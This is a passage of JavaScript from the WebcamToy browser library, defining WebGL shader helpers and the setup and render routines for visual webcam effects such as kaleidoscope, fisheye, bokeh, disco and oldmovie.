                        A.uniform1f(i, r);
                    } else {
                        throw 'Attempted to set uniform "' + t + '" to invalid value ' + (r || "undefined").toString();
                    }
                }
            }
        }
        return this;
    };
    A.prototype.textures = function (e) {
        this.gl.useProgram(this.program);
        for (var A in e) {
            if (e.hasOwnProperty(A)) {
                this.gl.uniform1i(this.gl.getUniformLocation(this.program, A), e[A]);
            }
        }
        return this;
    };
    A.prototype.drawRect = function (e, A, t, i) {
        var r = this.gl;
        if (!r) {
            return;
        }
        e = e || 0;
        A = A || 0;
        t = t || 1;
        i = i || 1;
        if (!r.vertexBuffer) {
            r.vertexBuffer = r.createBuffer();
        }
        r.bindBuffer(r.ARRAY_BUFFER, r.vertexBuffer);
        r.bufferData(r.ARRAY_BUFFER, new Float32Array([A, e, A, t, i, e, i, t]), r.STATIC_DRAW);
        if (!r.texCoordBuffer) {
            r.texCoordBuffer = r.createBuffer();
            r.bindBuffer(r.ARRAY_BUFFER, r.texCoordBuffer);
            r.bufferData(r.ARRAY_BUFFER, new Float32Array([0, 0, 0, 1, 1, 0, 1, 1]), r.STATIC_DRAW);
        }
        if (!this.vertexAttribute) {
            this.vertexAttribute = r.getAttribLocation(this.program, "vertex");
            r.enableVertexAttribArray(this.vertexAttribute);
        }
        if (!this.texCoordAttribute) {
            this.texCoordAttribute = r.getAttribLocation(this.program, "_texCoord");
            r.enableVertexAttribArray(this.texCoordAttribute);
        }
        r.useProgram(this.program);
        r.bindBuffer(r.ARRAY_BUFFER, r.vertexBuffer);
        r.vertexAttribPointer(this.vertexAttribute, 2, r.FLOAT, false, 0, 0);
        r.bindBuffer(r.ARRAY_BUFFER, r.texCoordBuffer);
        r.vertexAttribPointer(this.texCoordAttribute, 2, r.FLOAT, false, 0, 0);
        r.drawArrays(r.TRIANGLE_STRIP, 0, 4);
    };
    A.prototype.destroy = function () {
        try {
            if (this.gl && this.program) {
                this.gl.deleteProgram(this.program);
            }
        } catch (e) {}
        this.program = null;
        this.gl = null;
    };
    return A;
})(WebcamToy);
WebcamToy.Effect = (function (u) {
    "use strict";
    var t = [
            "mirrorleft",
            "mirrorright",
            "mirrortop",
            "mirrorbottom",
            "mirrorquad",
            "upsidedown",
            "switch",
            "kaleidoscope",
            "fragment",
            "quadcam",
            "splitscreen",
            "filmstrip",
            "ghost",
            "colorghost",
            "trail",
            "shuffle",
            "tunnel",
            "spiral",
            "twist",
            "dent",
            "pinch",
            "bulge",
            "fisheye",
            "wedge",
            "ripple",
            "stretch",
            "softfocus",
            "hazydays",
            "vintage",
            "rose",
            "retro",
            "cocoa",
            "xpro",
            "envy",
            "zinc",
            "citrus",
            "berry",
            "mint",
            "smoke",
            "halo",
            "bloom",
            "glaze",
            "watercolor",
            "silk",
            "oldmovie",
            "cocktail",
            "spycam",
            "hotpink",
            "bokeh",
            "flare",
            "danger",
            "rainbow",
            "trueblue",
            "mono",
            "lomo",
            "comicbook",
            "monoquad",
            "lomoquad",
            "comicstrip",
            "magazine",
            "blackwhite",
            "cartoon",
            "outline",
            "sketch",
            "crosshatch",
            "underwater",
            "fire",
            "snow",
            "disco",
            "sparkle",
            "glitch",
            "xray",
            "lsd",
            "alien",
            "nightvision",
            "thermal",
            "spectrum",
            "neon",
            "popart",
            "popbooth",
        ],
        C = {},
        v = u.ua.isMobile,
        h = 2,
        l = 253,
        f,
        A,
        r = 0,
        s = 3,
        o = { texture2: 1 },
        g = [2, 2, 2, 0, 0, 0, -2, -2, -2],
        b = [1, 2, 1, 2, -12, 2, 1, 2, 1],
        c = {
            add: function (e) {
                this.initShader("add");
                this.uniforms.add = { ratio: e || 0.5 };
            },
            alien: function () {
                this.initShader("alien");
                this.fps = 20;
            },
            blur: function (e) {
                if (!this.initShader("blur")) {
                    this.initShader("blursimple");
                }
                this.uniforms.blur1 = { delta: [(e || 32) / this.width, 0] };
                this.uniforms.blur2 = { delta: [0, (e || 32) / this.height] };
            },
            bloom: function () {
                this.uniforms = { center: this.center, radius: (this.isSquare ? this.height : this.width) / 4, width: this.height };
            },
            bokeh: function () {
                var e = this.maxLength / 8,
                    A = this.isSquare ? this.maxLength / 3 : (this.width + this.height) / 6,
                    t = this.maxLength / x.size.width;
                this.initShader("bokeh");
                this.initShader("radialblur");
                this.fps = 20;
                this.extraTexture = this.getTexture(C.bokeh);
                this.startTime = Date.now() - Math.random() * 100 - 50;
                this.uniforms = {
                    bokehs: [],
                    bokeh: { texSize: this.size, center: this.center, radius: this.minLength * 1.2, init: 1, time: 0 },
                    radialblur1: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [1 / this.width, 0] },
                    radialblur2: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [0, 1 / this.height] },
                };
                n.bounds.width = this.size[0];
                n.bounds.height = this.size[1];
                for (var i = 32; i--; ) {
                    var r = 128 - (i * i) / 24;
                    this.uniforms.bokehs.push(new n((n.bounds.width * Math.random() - r / 2) / t, (n.bounds.height * Math.random() - r / 2) / t, r, t));
                }
            },
            bulge: function () {
                this.uniforms = { mode: 1, strength: 0.9, center: this.center, radius: this.minLength / 4 };
            },
            cartoon: function () {
                this.initShader("cartoon");
                this.initShader("cartoonink");
                this.fps = 20;
                this.quality = 0.7;
                this.uniforms = { cartoonink: { size: [((2.5 / x.size.height) * this.height) / this.width, 2.5 / x.size.height] }, cartoon: { rect: this.getRect(0.01) } };
            },
            cocktail: function () {
                this.initShader("cocktail");
                this.initShader("cocktailborder");
                this.fps = 20;
                this.extraTexture = this.getTexture(this.isSquare ? C.cocktailsq : C.cocktail);
                this.uniforms = { rect: this.getRect(0.006), fade: x.size.width / 3, rotate: v && this.size[0] === this.width ? 1 : 0 };
            },
            cocoa: function () {
                this.initShader("cocoa");
                this.fps = 20;
                this.uniforms = { center: this.center, radius: (this.isSquare ? this.height : this.width) / 6, width: this.minLength * 0.58, rect: this.getRect(0.022), fade: 60 };
            },
            colorghost: function () {
                this.initShader("colorghost");
                this.initFrameTextures((this.fps = v ? 8 : 20), this.width, this.height);
                this.uniforms = { frame: 0, tex: { frame1: 1, frame2: 2 } };
            },
            comicbook: function () {
                this.quality = 0.55;
                this.uniforms = { quad: 0, center: this.center, size: Math.min(0.8, 400 / this.minLength), rect: this.getRect(0.02) };
            },
            comicstrip: function () {
                this.initShader("quadcam");
                this.initShader("comicbook");
                this.initShader("comicstripborder");
                this.quality = 0.55;
                this.isQuad = true;
                this.uniforms.comicstrip = { center: this.center, size: Math.min(0.8, 500 / this.minLength), rect: this.getRect(this.isSquare ? 0.028 : 0) };
                this.uniforms.comicstripwide = { wide: this.isSquare ? 0 : 1, square: this.isSquare ? 1 : 0 };
                this.uniforms.comicstripsquare = { wide: this.isSquare ? 0 : 1, square: 1 };
                this.uniforms.comicstripportrait = { wide: 0, square: 0 };
                this.uniforms.comicstripborder = { rect: this.getRect(0.018), border: [(0.009 * this.minLength) / this.maxLength, 0.009], wide: (this.maxLength - this.minLength / 2) / this.maxLength };
                this.uniforms.comicstripborderportrait = { rect: this.getRect(0.018), border: [0.009, (0.009 * this.minLength) / this.maxLength], wide: 0.5 };
            },
            danger: function () {
                this.uniforms = { center: this.center, radius: this.maxLength * 0.75, rect: this.getRect(0.05), fade: 32, stripe: [0.5, 2 / 3] };
            },
            dent: function () {
                this.initShader("bulge");
                this.uniforms = { mode: 0, strength: -1, center: this.center, radius: this.minLength / 4 };
            },
            disco: function () {
                this.initShader("discored");
                this.initShader("discogreen");
                this.initShader("discoblue");
                this.startTime = Date.now() - 2e3;
                this.uniforms = {
                    discolights: {},
                    discored: [
                        new e(3.3, 2.9, 0.3, 0.3),
                        new e(1.9, 2, 0.4, 0.4),
                        new e(0.8, 0.7, 0.4, 0.5),
                        new e(2.3, 0.1, 0.6, 0.3),
                        new e(0.8, 1.7, 0.5, 0.4),
                        new e(0.3, 1, 0.4, 0.4),
                        new e(1.4, 1.7, 0.4, 0.5),
                        new e(1.3, 2.1, 0.6, 0.3),
                        new e(1.8, 1.7, 0.5, 0.4),
                    ],
                    discogreen: [
                        new e(1.2, 1.9, 0.3, 0.3),
                        new e(0.7, 2.7, 0.4, 0.4),
                        new e(1.4, 0.6, 0.4, 0.5),
                        new e(2.6, 0.4, 0.6, 0.3),
                        new e(0.7, 1.4, 0.5, 0.4),
                        new e(0.7, 1.7, 0.4, 0.4),
                        new e(0.8, 0.5, 0.4, 0.5),
                        new e(1.4, 0.9, 0.6, 0.3),
                        new e(0.7, 1.3, 0.5, 0.4),
                    ],
                    discoblue: [
                        new e(3.7, 0.3, 0.3, 0.3),
                        new e(1.9, 1.3, 0.4, 0.4),
                        new e(0.8, 0.9, 0.4, 0.5),
                        new e(1.2, 1.7, 0.6, 0.3),
                        new e(0.3, 0.6, 0.5, 0.4),
                        new e(0.3, 0.3, 0.4, 0.4),
                        new e(1.4, 0.8, 0.4, 0.5),
                        new e(0.2, 0.6, 0.6, 0.3),
                        new e(1.3, 0.5, 0.5, 0.4),
                    ],
                };
            },
            envy: function () {
                var e = this.isSquare ? this.maxLength / 8 : (this.width + this.height) / 10,
                    A = this.isSquare ? this.maxLength / 1.5 : (this.width + this.height) / 3;
                this.initShader("envy");
                this.initShader("radialblur");
                this.initShader("envyborder");
                this.fps = 20;
                this.uniforms = {
                    radialblur1: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [1 / this.width, 0] },
                    radialblur2: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [0, 1 / this.height] },
                    envyborder: { rect: this.getRect(0.022), fade: x.size.width / 3 },
                };
            },
            fire: function () {
                var e = this.isSquare ? (this.width - this.height) / this.width / 2 : 0;
                this.initShader("fire");
                this.initShader("firevignette");
                this.initFrameTextures(6, this.width, this.height);
                this.fps = 20;
                this.quality = 0.7;
                this.uniforms = {
                    frame: 0,
                    center: this.center,
                    radius: this.minLength * 0.4,
                    width: (this.isSquare ? this.height : this.width) / 3,
                    left: e,
                    right: 1 - e,
                    tex: { frame1: 1, frame2: 2, frame3: 3, frame4: 4, frame5: 5, frame6: 6 },
                };
            },
            filmstrip: function () {
                var e = v ? 1.5 : 3,
                    A = this.isSquare ? (this.width - this.height) / this.width / 2 : 0;
                this.initShader("filmstrip");
                this.initFrameTextures(1, Math.round(this.width * e), Math.round(this.height * e));
                this.fps = 20;
                this.quality = 0.7;
                this.uniforms = { frame: 0, init: true, left: A, right: 1 - A };
            },
            fisheye: function () {
                this.initShader("bulge");
                this.uniforms = { mode: 1, strength: 1, center: this.center, radius: this.minLength * 0.75 };
            },
            ghost: function () {
                this.initShader("ghost");
                this.initFrameTextures((this.fps = v ? 8 : 20), this.width, this.height);
                this.uniforms.ghost = { frame: 0 };
            },
            glaze: function () {
                var e = this.maxLength / 2;
                this.initShader("glaze");
                this.initShader("overlay");
                this.fps = 20;
                this.uniforms = { glaze: { size: [e, e], time: 0 }, overlay: { rect: this.getRect(0.025), mult: 1.25, offset: 0.7 } };
            },
            glitch: function () {
                this.uniforms = { pixelSize: 20, center: this.center, width: this.maxLength / 2 };
            },
            halo: function () {
                this.initShader("halo");
                this.initShader("softfocus");
                this.fps = 20;
            },
            hazydays: function () {
                this.initShader("hazydays");
                this.extraTexture = this.getTexture(this.isSquare ? C.hazydayssq : C.hazydays);
                this.uniforms = { rotate: v && this.size[0] === this.width ? 1 : 0 };
            },
            hotpink: function () {
                this.initShader("hotpink");
                this.extraTexture = this.getTexture(C.hotpink);
            },
            kaleidoscope: function () {
                if (this.mainTexture.type === this.gl.FLOAT) {
                    this.initShader("kaleidoscope1");
                    this.initShader("kaleidoscope2");
                } else {
                    this.initShader("kaleidoscope");
                }
                this.uniforms = { center: this.center, offset: [this.width / 2, this.height * 0.1] };
            },
            lomo: function () {
                this.uniforms = { quad: 0, center: this.center, radius: this.width * 0.8, exposure: 2.25 };
            },
            lomoquad: function () {
                this.initShader("lomo");
                this.isQuad = true;
                this.uniforms.lomoquad = { center: this.center, radius: this.width * 0.85, exposure: 2.25, rect: this.getRect(0.028), fade: 80 };
            },
            lsd: function () {
                this.initShader("lsd");
                if (this.sourceTexture) {
                    this.sourceTexture.loadContentsOf(this.source);
                }
                if (this.tempTexture) {
                    this.tempTexture.drawTo(this.mainDrawRect);
                }
                this.fps = 15;
            },
            magazine: function () {
                var e = Math.PI / 3;
                this.quality = 0.6;
                this.uniforms = { center: this.center, size: Math.min(0.8, 400 / this.minLength), cosa: Math.cos(e), sina: Math.sin(e), rect: this.getRect(0.028), fade: 48 * 24 };
            },
            mix: function (e) {
                this.initShader("mix");
                this.uniforms.mix = { strength: e || 8 };
            },
            mono: function () {
                this.uniforms = { quad: 0 };
            },
            monoquad: function () {
                this.initShader("mono");
                this.isQuad = true;
                this.uniforms.monoquad = { rect: this.getRect(0.028), fade: 120 };
            },
            neon: function () {
                this.quality = 0.9;
            },
            nightvision: function () {
                this.quality = 0.7;
                this.uniforms = { center: this.center, radius: (this.isSquare ? this.height : this.maxLength) * 0.3 };
            },
            oldmovie: function () {
                this.initShader("oldmovienoise");
                this.initShader("oldmoviedirt");
                this.initShader("oldmoviesepia");
                this.fps = 10;
                this.quality = 0.7;
                this.uniforms = {
                    noise: { flicker: 0, jump: 0 },
                    line: 0,
                    dot0: new Array(3),
                    dot1: new Array(3),
                    dot2: new Array(3),
                    center: this.center,
                    radius: (this.isSquare ? this.height : this.maxLength) / 3,
                    width: this.maxLength / 2,
                };
            },
            outline: function () {
                this.quality = 0.7;
                this.uniforms = { rect: this.getRect(0.01) };
            },
            pinch: function () {
                this.initShader("bulge");
                this.uniforms = { mode: 1, strength: -0.5, center: this.center, radius: this.minLength / 4 };
            },
            popart: function () {
                this.initShader("popart");
                this.extraTexture = this.getTexture(C.popart);
                this.quality = 0.9;
            },
            popbooth: function () {
                this.initShader("popart");
                this.extraTexture = this.getTexture(C.popbooth);
            },
            quad: function () {
                this.uniforms.quad = { texSize: this.size, square: this.isSquare ? 1 : 0, quad: 1 };
            },
            quadcam: function () {
                this.initShader("quadcam");
                this.isQuad = true;
            },
            rainbow: function () {
                var e = (32 * this.height) / x.size.height;
                this.initShader("rainbow");
                this.initShader("overlay");
                this.initShader("rainbowborder");
                this.uniforms = {
                    rainbow: { size: [this.width, this.isSquare ? this.width : this.minLength], offset: this.isSquare ? 0.4 : 0.25 },
                    overlay: { rect: this.getRect(0), mult: 1.4, offset: 0.6 },
                    rainbowborder: { texSize: this.size, radius: e, border: 1.5, ratio: this.isSquare ? 1 : this.size[0] / this.size[1] },
                };
            },
            retro: function () {
                this.initShader("retro");
                this.extraTexture = this.getTexture(this.isSquare ? C.retrosq : C.retro);
                this.uniforms = { rotate: v && this.size[0] === this.width ? 1 : 0 };
            },
            ripple: function () {
                this.uniforms = { center: this.center, wavelength: this.minLength / 16, amplitude: this.minLength / 22 };
            },
            rose: function () {
                var e = this.isSquare ? this.height : this.maxLength;
                this.uniforms = { center: this.center, radius: e / 6.4, width: e * 0.75, rect: this.getRect(0.03), fade: 75 };
            },
            shuffle: function () {
                if (!v && this.initShader("shuffle")) {
                    this.initFrameTextures(27, this.width, this.height);
                    this.uniforms = { frame: 0, tex: { frame1: 1, frame2: 2, frame3: 3, frame4: 4, frame5: 5, frame6: 6, frame7: 7, frame8: 8, frame9: 9 } };
                } else {
                    this.initShader("shufflesimple");
                    this.initFrameTextures(12, this.width, this.height);
                    this.uniforms = { frame: 0, tex: { frame1: 1, frame2: 2, frame3: 3, frame4: 4 } };
                }
                this.fps = 20;
            },
            silk: function () {
                var e = (this.isSquare ? this.height : this.maxLength) / 8,
                    A = this.minLength;
                this.initShader("silk");
                this.initShader("radialblur");
                this.fps = 20;
                this.uniforms = {
                    silk: { texSize: this.size, center: this.center, radius: e * 2, width: A * 1.5 },
                    radialblur1: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [1 / this.width, 0] },
                    radialblur2: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [0, 1 / this.height] },
                };
            },
            snow: function () {
                var e = Math.max(60, Math.floor(this.minLength / 4)),
                    A = Math.floor((e * this.maxLength) / this.minLength);
                this.tempContext2D = x.getContext2D(A, e);
                this.assets.snowflakes = [];
                this.uniforms = { center: this.center, radius: (this.isSquare ? this.height : this.maxLength) / 3, width: this.minLength / 2 };
            },
            softfocus: function () {
                this.initShader("softfocus");
                this.fps = 20;
            },
            sparkle: function () {
                var e = Math.max(60, Math.floor(this.minLength / 4)),
                    A = Math.floor((e * this.maxLength) / this.minLength);
                this.initShader("sparkle");
                this.initFrameTextures(1, this.width, this.height);
                this.tempContext2D = x.getContext2D(A, e);
                this.fps = 20;
                this.assets.sparkles = [];
                this.uniforms = { mirror: this.isMirror ? 1 : 0, tex: { texture2: 1, texture3: 2 } };
            },
            spectrum: function () {
                this.quality = 0.7;
            },
            spiral: function () {
                var e = this.height / x.size.height,
                    A = 7,
                    t = 0.95 / e,
                    i = Math.cos(A),
                    r = Math.sin(A),
                    s = 60 * e,
                    o = 140 * e,
                    a = Math.log(o / s),
                    n = Math.atan(a / Math.PI / 2);
                if (this.mainTexture.type === this.gl.FLOAT) {
                    this.initShader("spiral1");
                    this.initShader("spiral2");
                } else {
                    this.initShader("spiral");
                }
                this.uniforms = { spiralx: s, a: a, center: this.center, za: [i * t, r * t], start: [(this.center[0] * i + this.center[1] * r) * -t, (this.center[1] * i - this.center[0] * r) * t], s: [Math.cos(n), Math.sin(n)] };
            },
            splitscreen: function () {
                this.initShader("splitscreen");
                this.initFrameTextures((this.fps = v ? 10 : 20), this.width, this.height);
                this.uniforms = { frame: 0 };
            },
            thermal: function () {
                this.initShader("thermal");
                this.extraTexture = this.getTexture(C.thermal);
                this.quality = 0.7;
            },
            trail: function () {
                this.initShader("trail");
                if (this.sourceTexture) {
                    this.sourceTexture.loadContentsOf(this.source);
                }
                if (this.tempTexture) {
                    this.tempTexture.drawTo(this.mainDrawRect);
                }
            },
            tunnel: function () {
                this.uniforms = { center: this.center, radius: this.minLength * 0.2 };
            },
            twist: function () {
                this.uniforms = { center: this.center, radius: this.minLength / 2, angle: (-150 * Math.PI) / 180 };
            },
            underwater: function () {
                this.initShader("underwater");
                this.initShader("underwaterblue");
                this.assets.bubbles = new Array(12);
                this.uniforms = { center: this.center, radius: (this.isSquare ? this.height : this.maxLength) / 3, width: this.minLength / 2 };
            },
            vintage: function () {
                this.initShader("vintage");
                this.extraTexture = this.getTexture(C.vintage);
                this.uniforms = { center: this.center, radius: (this.isSquare ? this.height : this.maxLength) / 3, width: this.minLength / 2, rotate: v && this.size[0] === this.width ? 1 : 0 };
            },
            watercolor: function () {
                this.initShader("watercolor");
                this.extraTexture = this.getTexture(C.watercolor);
                this.quality = 0.9;
                this.uniforms = { rect: this.getRect(0.028), fade: 100 };
            },
            wedge: function () {
                this.uniforms = { center: this.center };
            },
            xpro: function () {
                var e = this.isSquare ? this.maxLength / 6 : (this.width + this.height) / 8,
                    A = this.isSquare ? this.maxLength / 3 : (this.width + this.height) / 6;
                this.initShader("xpro");
                this.initShader("radialblur");
                this.initShader("xproborder");
                this.fps = 20;
                this.uniforms = {
                    radialblur1: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [1 / this.width, 0] },
                    radialblur2: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [0, 1 / this.height] },
                    xproborder: { rect: this.getRect(0.022), fade: 120 },
                };
            },
            zinc: function () {
                var e = this.isSquare ? this.maxLength / 6 : (this.width + this.height) / 8,
                    A = this.isSquare ? this.maxLength / 1.5 : (this.width + this.height) / 3;
                this.initShader("zinc");
                this.initShader("radialblur");
                this.fps = 20;
                this.uniforms = {
                    radialblur1: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [1 / this.width, 0] },
                    radialblur2: { texSize: this.size, center: this.center, blur: Math.floor(this.maxLength / 32), radius: e, width: A, delta: [0, 1 / this.height] },
                    zinc: { rect: this.getRect(0.022), fade: x.size.height / 3 },
                };
            },
        },
        i = {
            add: function (e) {
                if (!this.uniforms.add) {
                    c.add.call(this, e);
                }
                if (this.shaders.add) {
                    this.shaders.add.textures(o);
                    S.call(this, this.shaders.add, this.uniforms.add);
                }
            },
            alien: function () {
                if (this.shaders.alien) {
                    this.shaders.alien.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    i.blur.call(this, Math.floor(this.maxLength / 16));
                    S.call(this, this.shaders.alien);
                }
                this.mainDraw();
            },
            blur: function (e) {
                if (this.shaders.blursimple) {
                    S.call(this, this.shaders.blursimple, this.uniforms);
                } else {
                    if (!this.uniforms.blur1) {
                        c.blur.call(this, e);
                    }
                    S.call(this, this.shaders.blur, this.uniforms.blur1);
                    S.call(this, this.shaders.blur, this.uniforms.blur2);
                }
            },
            bokeh: function () {
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur1);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur2);
                if (this.shaders.bokeh && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.bokeh.textures(o);
                    this.uniforms.bokeh.time = this.uniforms.time;
                    for (var e = 4; e--; ) {
                        this.uniforms.bokeh.init = e === 3 ? 1 : 0;
                        for (var A = 8; A--; ) {
                            this.uniforms.bokeh["p" + A] = this.uniforms.bokehs[A + e * 8].move();
                        }
                        S.call(this, this.shaders.bokeh, this.uniforms.bokeh);
                    }
                }
                this.mainDraw();
            },
            cartoon: function () {
                S.call(this, this.shaders.cartoonink, this.uniforms.cartoonink);
                S.call(this, this.shaders.cartoon, this.uniforms.cartoon);
                this.mainDraw();
            },
            cocktail: function () {
                if (this.shaders.cocktail && this.extraTexture) {
                    this.shaders.cocktail.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    i.blur.call(this, Math.floor(this.maxLength / 16));
                    S.call(this, this.shaders.cocktail, this.uniforms);
                    this.extraTexture.use(1);
                    this.shaders.cocktailborder.textures(o);
                    S.call(this, this.shaders.cocktailborder, this.uniforms);
                }
                this.mainDraw();
            },
            cocoa: function () {
                if (this.shaders.cocoa) {
                    this.shaders.cocoa.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    i.blur.call(this, Math.floor(this.maxLength / 32));
                    S.call(this, this.shaders.cocoa, this.uniforms);
                }
                this.mainDraw();
            },
            colorghost: function () {
                var e = this.uniforms.frame,
                    A = this.frameTextures.length;
                this.mainTexture.use(0);
                this.frameTextures[e].drawTo(this.defaultDrawRect);
                e++;
                this.uniforms.frame = e %= A;
                this.frameTextures[e].use(1);
                this.frameTextures[(e + A / 2) % A].use(2);
                if (this.shaders.colorghost) {
                    this.shaders.colorghost.textures(this.uniforms.tex);
                    S.call(this, this.shaders.colorghost);
                }
                this.mainDraw();
            },
            comicstrip: function () {
                if (this.shaders.comicbook) {
                    this.shaders.comicbook.uniforms(this.uniforms.comicstrip);
                    i.quad.call(this, this.shaders.comicbook);
                }
            },
            dent: function () {
                S.call(this, this.shaders.bulge, this.uniforms);
                this.mainDraw();
            },
            disco: function () {
                var e = this.uniforms.time,
                    A;
                for (A = 0; A < 9; A++) {
                    this.uniforms.discolights["p" + A] = this.uniforms.discored[A].getPos(e);
                }
                S.call(this, this.shaders.discored, this.uniforms.discolights);
                for (A = 0; A < 9; A++) {
                    this.uniforms.discolights["p" + A] = this.uniforms.discogreen[A].getPos(e);
                }
                S.call(this, this.shaders.discogreen, this.uniforms.discolights);
                for (A = 0; A < 9; A++) {
                    this.uniforms.discolights["p" + A] = this.uniforms.discoblue[A].getPos(e);
                }
                S.call(this, this.shaders.discoblue, this.uniforms.discolights);
                this.mainDraw();
            },
            envy: function () {
                S.call(this, this.shaders.envy);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur1);
                S.call(this, this.shaders.radialblur, this.uniforms.radialblur2);
                S.call(this, this.shaders.envyborder, this.uniforms.envyborder);
                this.mainDraw();
            },
            filmstrip: function () {
                var A = this.defaultShader,
                    e = this.frameTextures[0],
                    t = this.uniforms.frame,
                    i;
                this.mainTexture.use(0);
                this.gl.viewport(0, 0, e.width, e.height);
                if (this.uniforms.init) {
                    this.uniforms.init = false;
                    e.drawTo(function () {
                        for (i = 0; i < 6; i++) {
                            for (var e = 0; e < 6; e++) {
                                A.drawRect(i / 6, e / 6, (i + 1) / 6, (e + 1) / 6);
                            }
                        }
                    }).use(1);
                } else {
                    e.drawTo(function () {
                        for (i = 0; i < 6; i++) {
                            switch (t) {
                                case i:
                                    A.drawRect(i / 6, 0, (i + 1) / 6, 1 / 6);
                                    break;
                                case i + 6:
                                    A.drawRect(i / 6, 1 / 6, (i + 1) / 6, 2 / 6);
                                    break;
                                case i + 12:
                                    A.drawRect(i / 6, 2 / 6, (i + 1) / 6, 0.5);
                                    break;
                                case i + 18:
                                    A.drawRect(i / 6, 0.5, (i + 1) / 6, 4 / 6);
                                    break;
                                case i + 24:
                                    A.drawRect(i / 6, 4 / 6, (i + 1) / 6, 5 / 6);
                                    break;
                                case i + 30:
                                    A.drawRect(i / 6, 5 / 6, (i + 1) / 6, 1);
                                    break;
                            }
                        }
                    }).use(1);
                }
                this.gl.viewport(0, 0, this.width, this.height);
                if (this.shaders.filmstrip) {
                    this.shaders.filmstrip.textures(o);
                    S.call(this, this.shaders.filmstrip, this.uniforms);
                }
                t++;
                this.uniforms.frame = t %= 36;
                this.mainDraw();
            },
            fire: function () {
                var e,
                    A = this.uniforms.frame,
                    t = this.frameTextures.length;
                this.mainTexture.use(0);
                this.frameTextures[A].drawTo(this.defaultDrawRect);
                A++;
                this.uniforms.frame = A %= t;
                for (e = t; e--; ) {
                    this.frameTextures[(A + e) % t].use(e + 1);
                }
                if (this.shaders.fire) {
                    this.shaders.fire.textures(this.uniforms.tex);
                    S.call(this, this.shaders.fire, this.uniforms);
                    S.call(this, this.shaders.firevignette, this.uniforms);
                }
                this.mainDraw();
            },
            fisheye: function () {
                S.call(this, this.shaders.bulge, this.uniforms);
                this.mainDraw();
            },
            ghost: function () {
                var e = this.uniforms.ghost.frame;
                this.mainTexture.use(0);
                this.frameTextures[e].drawTo(this.defaultDrawRect);
                e++;
                this.uniforms.ghost.frame = e %= this.frameTextures.length;
                this.frameTextures[e].use(1);
                i.add.call(this, 0.5);
                this.mainDraw();
            },
            glaze: function () {
                var e = this;
                this.uniforms.glaze.time = this.uniforms.time;
                this.mainTexture.use(0);
                if (this.tempTexture) {
                    this.tempTexture
                        .drawTo(function () {
                            e.shaders.glaze.uniforms(e.uniforms.glaze).drawRect();
                        })
                        .use(1);
                }
                if (this.shaders.overlay) {
                    this.shaders.overlay.textures(o);
                    S.call(this, this.shaders.overlay, this.uniforms.overlay);
                }
                this.mainDraw();
            },
            halo: function () {
                if (this.shaders.softfocus) {
                    this.shaders.softfocus.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    i.blur.call(this, Math.floor(this.maxLength / 16));
                    S.call(this, this.shaders.softfocus);
                }
                S.call(this, this.shaders.halo, this.uniforms);
                this.mainDraw();
            },
            hazydays: function () {
                if (this.shaders.hazydays && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.hazydays.textures(o);
                    S.call(this, this.shaders.hazydays, this.uniforms);
                }
                this.mainDraw();
            },
            hotpink: function () {
                if (this.shaders.hotpink && this.extraTexture) {
                    this.extraTexture.use(1);
                    this.shaders.hotpink.textures(o);
                    S.call(this, this.shaders.hotpink);
                }
                this.mainDraw();
            },
            kaleidoscope: function () {
                if (this.mainTexture.type === this.gl.FLOAT && this.shaders.kaleidoscope2) {
                    this.shaders.kaleidoscope2.textures(o);
                    if (this.tempTexture) {
                        this.tempTexture.drawTo(this.mainDrawRect).use(1);
                    }
                    S.call(this, this.shaders.kaleidoscope1, this.uniforms);
                    S.call(this, this.shaders.kaleidoscope2, this.uniforms);
                } else {
                    S.call(this, this.shaders.kaleidoscope, this.uniforms);
                }
                this.mainDraw();
            },
            lomoquad: function () {
                if (this.shaders.lomo) {
                    this.shaders.lomo.uniforms(this.uniforms.lomoquad);
                    i.quad.call(this, this.shaders.lomo);
                }
            },
            lsd: function () {
                if (this.tempTexture) {
                    this.tempTexture.use(1);
                }
                i.blur.call(this, 2);
                S.call(this, this.shaders.lsd);
                i.add.call(this, v ? 0.6 : 0.85);
                if (this.tempTexture) {
                    this.tempTexture.swapWith(this.mainTexture);
                }
                this.mainDraw();
            },
            mix: function (e) {
                if (!this.uniforms.mix) {
                    c.mix.call(this, e);
                }
                if (this.shaders.mix) {
                    this.shaders.mix.textures(o);
                    S.call(this, this.shaders.mix, this.uniforms.mix);
                }
            },
            monoquad: function () {
                if (this.shaders.mono) {
                    this.shaders.mono.uniforms(this.uniforms.monoquad);
                    i.quad.call(this, this.shaders.mono);
                }
            },
            oldmovie: function () {
                if (Math.random() < 0.04) {
                    this.uniforms.noise.jump = Math.random() * 0.02 + 0.02;
                } else {
                    this.uniforms.noise.jump = 0;
                }
                this.uniforms.noise.flicker = Math.random() * 1.25;
                this.uniforms.dot0[0] = Math.random() * this.width;
                this.uniforms.dot1[0] = Math.random() * this.width;
                this.uniforms.dot2[0] = Math.random() * this.width;
                this.uniforms.dot0[1] = Math.random() * this.height;
                this.uniforms.dot1[1] = Math.random() * this.height;
                this.uniforms.dot2[1] = Math.random() * this.height;
                this.uniforms.dot0[2] = (Math.random() * this.width) / 60 + 1;
